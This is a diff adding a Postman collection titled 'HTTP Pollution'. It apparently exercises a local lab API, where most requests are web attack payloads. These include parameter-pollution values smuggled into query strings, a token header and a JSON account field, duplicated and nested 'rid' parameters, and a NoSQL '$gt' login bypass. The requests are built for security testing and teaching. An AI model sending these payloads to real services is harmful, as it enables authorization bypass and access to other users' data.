@@ -1,0 +1,303 @@
+{
+	"info": {
+		"_postman_id": "085f4174-706d-4289-a6c4-1e436e903c68",
+		"name": "HTTP Pollution",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "Home API",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "token",
+						"value": "firstusertoken",
+						"type": "text"
+					}
+				],
+				"url": {
+					"raw": "127.0.0.1:3000/",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "3000",
+					"path": [
+						""
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Login to API",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n    \"user\": \"jsmith\",\n    \"pass\": \"password\"\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "127.0.0.1:3000/login",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "3000",
+					"path": [
+						"login"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Bypass Identity Service",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "token",
+						"value": "firstusertoken",
+						"type": "text"
+					}
+				],
+				"url": {
+					"raw": "127.0.0.1:3000/me?fields=surname%26id=1",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "3000",
+					"path": [
+						"me"
+					],
+					"query": [
+						{
+							"key": "fields",
+							"value": "surname%26id=1"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Bypass Resource Service",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "token",
+						"value": "firstusertoken&rid=2",
+						"type": "text"
+					}
+				],
+				"url": {
+					"raw": "127.0.0.1:3000/resource?rid=1",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "3000",
+					"path": [
+						"resource"
+					],
+					"query": [
+						{
+							"key": "rid",
+							"value": "1"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Bypass Thirdparty Service",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "token",
+						"value": "firstusertoken",
+						"type": "text"
+					}
+				],
+				"url": {
+					"raw": "127.0.0.1:3000/thirdparty?rid=1&rid=3",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "3000",
+					"path": [
+						"thirdparty"
+					],
+					"query": [
+						{
+							"key": "rid",
+							"value": "1"
+						},
+						{
+							"key": "rid",
+							"value": "3"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "FunkyAPI",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "token",
+						"value": "firstusertoken",
+						"type": "text"
+					}
+				],
+				"url": {
+					"raw": "127.0.0.1:3000/funky?rid[rid]=1&rid[rid]=2",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "3000",
+					"path": [
+						"funky"
+					],
+					"query": [
+						{
+							"key": "rid[rid]",
+							"value": "1"
+						},
+						{
+							"key": "rid[rid]",
+							"value": "2"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Bypass Login to API",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n    \"user\": {\"$gt\": \"\"},\n    \"pass\": {\"$gt\": \"\"}\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "127.0.0.1:3000/login",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "3000",
+					"path": [
+						"login"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Bypass Corebank Service",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "token",
+						"value": "firstusertoken",
+						"type": "text"
+					}
+				],
+				"url": {
+					"raw": "127.0.0.1:3000/corebank?rid=1&rid=2,3,4,5",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "3000",
+					"path": [
+						"corebank"
+					],
+					"query": [
+						{
+							"key": "rid",
+							"value": "1"
+						},
+						{
+							"key": "rid",
+							"value": "2,3,4,5"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Unsafe Link Account",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n    \"customerId\": \"1\",\n    \"linkedAcnt\": \"93287661262&rid=2\"\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "127.0.0.1:3000/linkaccount",
+					"host": [
+						"127",
+						"0",
+						"0",
+						"1"
+					],
+					"port": "3000",
+					"path": [
+						"linkaccount"
+					]
+				}
+			},
+			"response": []
+		}
+	]
+}
